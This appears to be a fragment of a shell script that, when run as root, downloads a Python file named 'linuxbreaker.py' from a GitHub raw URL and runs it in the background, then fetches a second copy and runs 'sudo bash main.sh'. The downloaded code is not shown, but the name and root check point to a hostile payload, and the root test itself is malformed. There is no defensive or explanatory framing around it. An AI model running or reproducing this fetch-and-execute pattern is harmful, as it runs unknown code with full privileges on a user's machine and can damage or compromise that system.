...
if [[ $(id -u -eq 0) ]]; then
wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/main/linuxbreaker.py -b; python3 linuxbreaker.py &
...
wget https://raw.githubusercontent.com/User-2357/LinuxBreaker/User-2357-patch-1/linuxbreaker.py -b; sudo bash main.sh
